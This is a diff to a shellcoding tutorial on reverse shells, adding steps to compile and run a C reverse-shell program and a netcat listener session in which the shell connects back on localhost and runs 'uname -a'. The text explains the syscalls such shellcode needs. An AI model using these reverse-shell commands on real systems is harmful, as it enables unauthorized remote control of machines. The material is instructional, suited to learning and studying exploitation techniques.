@@ -7,7 +7,7 @@
 
 <p style="text-align: justify;">Reverse Shell consists of "sending" the shell, for example "/bin/sh" towards the listening attacker port. Unlike Bind Shell, we no longer need to bind on a port, listen on it and accept connections. All you need is a single sys_connect() syscall that does the same job connecting to, for example, listening netcat.</p>
 
-First, we'll try to reproduce this behavior using a C program.
+First, we'll try to reproduce this behavior using a program written in C.
 
 ```c
 #include <stdio.h>
@@ -44,8 +44,20 @@ int main(int argc, char **argv)
 	return 0;
 }
 ```
-
-<p style="text-align: justify;">As we can see, in order to create a properly working program, it is necessary to use several so-called system calls. In this case, they are:</p>
+Let's compile and execute it.
+```sh
+$ gcc reverse_shell.c -o reverse_shell
+$ ./reverse_shell
+```
+Second terminal:
+```sh
+$ nc -nvlp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 45823)
+uname -a
+Linux ubuntu 3.5.0-51-generic #76-Ubuntu SMP Thu May 15 21:19:44 UTC 2014 i686 i686 i686 GNU/Linux
+```
+<p style="text-align: justify;">Perfectly, at the time of shellcode execution, the listening port receives a reverse shell. As we can see, in order to create a properly working program, it is necessary to use several so-called system calls. In this case, they are:</p>
 
 - sys_socket()
 - sys_connect()
